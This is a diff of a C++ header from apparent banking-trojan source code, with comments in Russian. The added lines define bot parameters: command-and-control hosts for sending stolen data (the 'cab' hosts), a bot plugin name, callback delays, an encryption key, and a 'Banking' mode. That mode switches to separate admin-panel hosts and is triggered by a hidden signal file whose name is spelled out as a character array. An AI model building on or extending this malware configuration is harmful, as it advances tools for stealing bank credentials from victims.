@@ -36,10 +36,11 @@
 
 // Максимальные размеры массивов с данными
 #define MAX_MAINHOSTS_BUF_SIZE 500 /* Размер буфера хранения ссылок */
-#define MAX_BANKHOSTS_BUF_SIZE 128 /* размер буфера хранения хостов отправки кабов */
+#define MAX_BANKHOSTS_BUF_SIZE 500 /* размер буфера хранения хостов отправки кабов */
 #define MAX_PASSWORD_SIZE      32  /* Размер буфера хранения основного пароля */
 #define MAX_PREFIX_SIZE        20  /* Размер буфера для префикса бота */
 #define MAX_DELAY_SIZE         8   /* Буфер для хранения задержки */
+#define MAX_BOT_PLUG_NAME_SIZE 100 /* Буфер для хранения имени ботплага */
 
 
 #define DEFAULT_DELAY  10 /* Задержка по умолчанию */
@@ -52,6 +53,7 @@
 #define BOTPARAM_BANKHOSTS    "CAB_HOSTS_BUFFER\0\0"
 #define BOTPARAM_DELAY        "DELAY_"
 #define BOTPARAM_MAINPASSWORD "MAIN_PASSWORD"
+#define BOTPARAM_PLUG_NAME    "PLUG_NAME"
 
 
 //Хэши имён параметров
@@ -73,7 +75,7 @@
 //--------------------------------------------------------
 //  Им сигнального файла режима Банк
 //  Если файл с таким именем будет лежать в директории
-//  Application Data
+//  Application Data...дополнить коментарий
 //--------------------------------------------------------
 const static char BANKING_SIGNAL_FILE[] = {'p','r','f','b','n','s','m','t','.','i','n','i', 0};
 const DWORD BANKING_SIGNAL_FILE_HASH = 0x2709A4B5; /* prfbnsmt.ini */
@@ -88,8 +90,8 @@ PCHAR GetBotHosts();
 //  GetActiveHost - Функция возвращает первый рабочий хост
 //					В случае успеха функция возвращает новую строку
 //------------------------------------------------------------------
-PCHAR GetActiveHost();
-string GetActiveHost2();
+//PCHAR GetActiveHost();
+string GetActiveHost(bool CheckBankingMode = true);
 
 
 //------------------------------------------------------------------
@@ -116,8 +118,13 @@ PCHAR GetMainPassword(bool NotNULL = false);
 //  GetBotScriptURL - Функция возвращает полный адрес указанного скрипта
 //  Если указать Path то будет использован этот путь, в противном случае
 //  будет использоваться путь прописанный для скрипта с номером Script
+//
+//  CheckBankingMode - Указание проверять режим хостов. Если
+//					   CheckBankingMode == true и бот находится в режиме
+//				       Banking, то хосты будут браться из массива хостов
+//					   Banking админок
 //------------------------------------------------------------------------
-PCHAR GetBotScriptURL(DWORD Script, PCHAR Path = NULL);
+PCHAR GetBotScriptURL(DWORD Script, PCHAR Path = NULL, bool CheckBankingMode = true);
 
 
 
@@ -125,7 +132,7 @@ PCHAR GetBotScriptURL(DWORD Script, PCHAR Path = NULL);
 //  GetBankingScriptURL-  Функция возвращает адрес
 //		скрипта с проверкой включенного режима Banking
 //-----------------------------------------------------
-string GetBankingScriptURL(DWORD Script, bool CheckBankingMode);
+//string GetBankingScriptURL(DWORD Script, bool CheckBankingMode);
 
 
 
@@ -139,15 +146,18 @@ char *GetPrefix(bool CheckBankingMode = false);
 
 
 void SetBankingMode(bool IsBanking = true);
+bool IsBankingMode();
 
 
 //------------------------------------------------------------------------
 //  Идентификаторы параметров бота
 //------------------------------------------------------------------------
-#define BOT_PARAM_PREFIX 1   /* Префикс бота  */
-#define BOT_PARAM_HOSTS  2   /* Хосты бота */
-#define BOT_PARAM_KEY    3   /* Ключ ши фрования */
-#define BOT_PARAM_DELAY  4   /* Время отстука */
+#define BOT_PARAM_PREFIX       1   /* Префикс бота  */
+#define BOT_PARAM_HOSTS        2   /* Хосты бота */
+#define BOT_PARAM_KEY          3   /* Ключ ши фрования */
+#define BOT_PARAM_DELAY        4   /* Время отстука */
+#define BOT_PARAM_BOTPLUGNAME  5   /* Имя ботплага */
+#define BOT_PARAM_BANKINGHOSTS 6   /* Хосты отстука в BANKING режиме */
 
 
 
